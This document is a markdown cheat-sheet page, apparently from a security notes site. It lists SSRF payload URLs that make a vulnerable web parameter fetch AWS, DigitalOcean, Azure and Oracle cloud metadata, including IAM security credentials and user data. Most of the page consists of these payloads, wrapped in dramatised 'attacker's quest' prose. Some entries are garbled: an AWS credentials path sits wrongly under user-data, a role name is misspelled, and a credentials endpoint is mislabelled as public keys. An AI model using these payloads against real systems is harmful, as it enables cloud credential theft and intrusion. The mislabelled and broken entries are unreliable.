---
cover: ../../.gitbook/assets/10.png
coverY: -15
---

# 🎣 Unveiling the Secrets of Cloud Provider Metadata Through SSRF

In the realm of cybersecurity, Server-Side Request Forgery (SSRF) emerges as a cunning infiltrator, capable of unveiling the closely guarded secrets of cloud providers like AWS, Google Cloud, Azure, and DigitalOcean. This covert operation relies on the art of exploiting private addressing, cleverly concealed within each provider's documentation.

### **AWS: Navigating the AWS Matrix**

For AWS, the attacker's journey commences with a departure from the familiar realms of 'localhost' or '127.0.0.1,' and instead embarks on an odyssey towards the enigmatic '169.254.169.254' address—a portal to the AWS matrix of information. Here, a trove of valuable data awaits, including public keys, security credentials, hostnames, unique IDs, and much more.

* _Unmasking User Data_: The attacker navigates the AWS labyrinth with URLs like:

```
https://target.com/page?url=http://169.254.169.254/latest/user-data
```

Unveiling hidden user data, like a cryptographer deciphering an ancient scroll.

* _IAM Credentials_: The journey deepens as URLs reveal the hidden identities within AWS:

```
https://target.com/page?url=http://169.254.169.254/latest/user-data/iam/security-credentials/ROLE_NAME
```

Like a spy seeking covert aliases, the attacker discovers IAM security credentials.

* _Meta-Data Quest_: The meta-data realms are rich with secrets to plunder:

```
https://target.com/page?url=http://169.254.169.254/latest/meta-data
```

Within, one can uncover a trove of insights, from hostnames to AMI IDs and more.

* _Public Key Pursuit_: In this expedition, the attacker seeks the keys to the kingdom:

```
https://target.com/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

Public keys, like mystical artifacts, are ready to be seized.

AWS's official documentation holds even more cryptic links, unveiling the full extent of their metadata treasure trove.

### **DigitalOcean: Navigating the Digital Seas**

Much like AWS, DigitalOcean sails the seas of '169.254.169.254,' guarding its secrets in the depths of metadata. Adventurers are encouraged to consult the documentation for further maps.

* _Metadata Mapping_: URLs like this lead to the secrets of DigitalOcean's metadata:

```
https://target.com/page?url=http://169.254.169.254/metadata/v1.json
```

Here, the attacker deciphers the JSON-encoded metadata, revealing invaluable information.

* _Identity Insights_: Another trail to follow, hinting at identity revelations:

```
https://target.com/page?url=http://169.254.169.254/metadata/v1/id
```

Identity data becomes a treasure trove waiting to be unearthed.

* _UserData Unveiled_: The pursuit of user data continues:

```
https://target.com/page?url=http://169.254.169.254/metadata/v1/user-data
```

What secrets lie within the user data vault?

* _Regional Revelations_: Regional metadata exploration leads to uncharted territory:

```
https://target.com/page?url=http://169.254.169.254/metadata/v1/region
```

Insights into the server's geographical context emerge.

* _Interface Intrigue_: Investigating interfaces, a deeper understanding is achieved:

```
https://target.com/page?url=http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
```

Even IPv6 addresses are laid bare for scrutiny.

### **Azure and Oracle Cloud: Limited Yet Intriguing Secrets**

Azure and Oracle Cloud, though more guarded in their revelations, harbor their own troves of concealed data, accessible through SSRF.

### **Azure: Navigating Azure's Metadata**

Azure's metadata can be unveiled with a specific header requirement: 'Metadata: true.' Once this entry point is secured, explorers can delve into the hidden domains.

* _Maintenance Insights_: A glimpse into Azure's maintenance activities awaits:

```
https://target.com/page?url=http://169.254.169.254/metadata/maintenance
```

Discover the behind-the-scenes operations that keep Azure running smoothly.

* _Instance Exploration_: Further into the Azure labyrinth, uncover instance-specific metadata:

```
https://target.com/page?url=http://169.254.169.254/metadata/instance?api-version=2019-10-01
```

Dive into the unique characteristics of your Azure instance.

* _IP Address Intel_: For those curious about IP addresses, Azure discloses IPv4 details:

```
https://target.com/page?url=http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2019-10-01&format=text
```

Gain insights into public IP addresses associated with your Azure instance.

### **Oracle Cloud: Unearthing Oracle's Mysteries**

Oracle Cloud, with its secrets hidden behind the '192.0.0.192' address, invites intrepid explorers to uncover its concealed treasures.

* _Latest Discoveries_: Begin your quest by accessing the latest revelations from Oracle Cloud:

```
https://target.com/page?url=http://192.0.0.192/latest/
```

Learn what's currently on offer from Oracle's digital realm.

* _Metadata Expedition_: Venture deeper into the metadata territory:



```
https://target.com/page?url=http://192.0.0.192/latest/meta-data/
```

Explore metadata that sheds light on the inner workings of Oracle Cloud.

* _User Data Quest_: Seek user-specific data, a key to understanding Oracle's ecosystem:

```
https://target.com/page?url=http://192.0.0.192/latest/user-data/
```

Uncover the digital footprint left by users within Oracle Cloud.

* _Attributes Unveiled_: Delve into attributes that define Oracle's digital landscape:

```
https://target.com/page?url=http://192.0.0.192/latest/attributes/
```

Gain a deeper understanding of the attributes that shape Oracle Cloud's operations.

As you embark on these expeditions into the hidden realms of Azure and Oracle Cloud, remember that with great knowledge comes great responsibility. While these discoveries provide insights, they also highlight the importance of safeguarding such sensitive information from unauthorized access and potential security threats.
